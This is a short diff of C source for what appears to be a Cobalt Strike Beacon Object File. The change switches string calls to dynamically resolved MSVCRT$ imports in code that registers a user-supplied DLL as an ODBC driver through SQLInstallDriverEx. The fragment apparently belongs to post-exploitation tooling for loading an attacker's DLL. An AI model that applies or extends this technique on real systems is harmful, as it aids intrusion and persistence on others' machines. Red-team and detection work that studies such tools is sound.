@@ -108,7 +108,7 @@ void go(char* args, int argc) {
 
     LPCWSTR driverDLL = SHLWAPI$PathFindFileNameW(parsedArgs.dllpath);
     WCHAR path[MAX_PATH];
-    wcscpy(path, parsedArgs.dllpath);
+    MSVCRT$wcscpy(path, parsedArgs.dllpath);
     SHLWAPI$PathRemoveFileSpecW(path);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[-] DLL Path is %ls\n", path);
@@ -120,14 +120,14 @@ void go(char* args, int argc) {
     USER32$wsprintfW(section2, L"Driver=%ls", driverDLL);
     USER32$wsprintfW(section3, L"Setup=%ls", driverDLL);
 
-    int driver_len = wcslen(section1) + 1 + wcslen(section2) + 1 + wcslen(section3) + 1 + 1;
+    int driver_len = MSVCRT$wcslen(section1) + 1 + MSVCRT$wcslen(section2) + 1 + MSVCRT$wcslen(section3) + 1 + 1;
 
     // Build the final string
     WCHAR driver_info[512];
     PWSTR pos = driver_info;
-    wcscpy(pos, section1); pos += wcslen(section1) + 1;
-    wcscpy(pos, section2); pos += wcslen(section2) + 1;  
-    wcscpy(pos, section3); pos += wcslen(section3) + 1;
+    MSVCRT$wcscpy(pos, section1); pos += MSVCRT$wcslen(section1) + 1;
+    MSVCRT$wcscpy(pos, section2); pos += MSVCRT$wcslen(section2) + 1;  
+    MSVCRT$wcscpy(pos, section3); pos += MSVCRT$wcslen(section3) + 1;
     *pos = '\0';
 
     BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling SQLInstallDriverEx\n");
